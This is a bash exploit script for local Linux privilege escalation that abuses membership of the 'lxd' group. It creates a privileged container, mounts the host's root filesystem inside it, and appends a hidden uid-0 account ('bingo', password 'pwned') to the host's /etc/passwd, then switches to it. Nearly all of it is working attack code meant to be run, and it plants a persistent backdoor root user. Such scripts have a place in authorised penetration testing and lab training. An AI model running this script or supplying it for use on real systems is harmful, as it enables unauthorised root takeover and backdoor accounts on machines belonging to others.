#!/bin/bash
#
# This script exploit a local linux privilege escalation when the user has "lxd" group privilege. 
# you can use this alpine image: https://github.com/saghul/lxd-alpine-builder
# then run: ./lxd-linux-group-privesc.sh alpine.tar.gz
# the script will add a root user to the system, User: bingo | Password: pwned
# switch to that user to get root!
#

[[ -z "$1" ]] && { printf "[!] Usage: ./lxd-priesc.sh <IMAGE.tar.gz>\n"; exit 1; }

FILE="$1"

echo "[+] Initiation:"
lxd init

echo "[+] Import Alpine Image:"
lxc image import "$FILE" --alias privesc

echo "[+] Verifying The Import:"
lxc image list

echo "[+] Creating a Container:"
lxc init privesc privesc-pwned -c security.privileged=true

echo "[+] Verifying The Container:"
lxc list

echo "[+] Mounting / to /mnt/pwn:"
lxc config device add privesc-pwned rooted disk source=/ path=/mnt/pwn recursive=true

echo "[+] Starting The Container:"
lxc start privesc-pwned

echo "[+] Verifying The Container:"
lxc list

#echo "[+] Connecting To The Container:"
#lxc exec privesc-pwned /bin/sh

echo "[+] Adding a New root User To The System:"
lxc exec privesc-pwned -- sh -c 'echo "bingo:\$1\$bingo\$3hsGN5T46YggQbdjWYZ9o0:0:0:baam:/root:/bin/bash" >> /mnt/pwn/etc/passwd'

echo "[+] Enter Password as: pwned"
su bingo
